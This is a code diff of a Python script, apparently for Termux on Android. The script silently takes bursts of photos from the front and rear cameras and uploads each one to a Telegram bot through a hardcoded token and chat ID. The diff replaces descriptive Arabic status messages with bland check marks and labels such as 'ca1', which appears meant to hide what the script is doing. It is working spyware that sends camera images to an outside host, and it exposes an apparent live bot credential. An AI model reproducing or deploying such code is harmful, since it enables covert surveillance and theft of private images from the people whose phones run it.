@@ -6,7 +6,7 @@ import requests
 TOKEN = '8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w'
 CHAT_ID = '1249382653'
 
-def send_photo(photo_path, caption="📷 صورة ملتقطة"):
+def send_photo(photo_path, caption="✔️"):
     if os.path.exists(photo_path):
         with open(photo_path, 'rb') as photo:
             r = requests.post(
@@ -24,13 +24,13 @@ def capture_and_send(camera_id, label):
         print(f"[+] التقاط {label} {i+1}")
         os.system(f"termux-camera-photo -c {camera_id} {filename}")
         time.sleep(0.2)
-        send_photo(filename, f"📸 {label} {i+1}")
+        send_photo(filename, f"✔️ {label} {i+1}")
 
 # === تنفيذ المهام ===
-print("📸 بدء التقاط الصور الأمامية...")
-capture_and_send(camera_id=1, label="كاميرا_أمامية")
+print("✔️ 1")
+capture_and_send(camera_id=1, label="ca1")
 
-print("📸 بدء التقاط الصور الخلفية...")
-capture_and_send(camera_id=0, label="كاميرا_خلفية")
+print("✔️.")
+capture_and_send(camera_id=0, label="ca2")
 
-print("✅ تم التقاط وإرسال جميع الصور.")
+print("✔️all.")
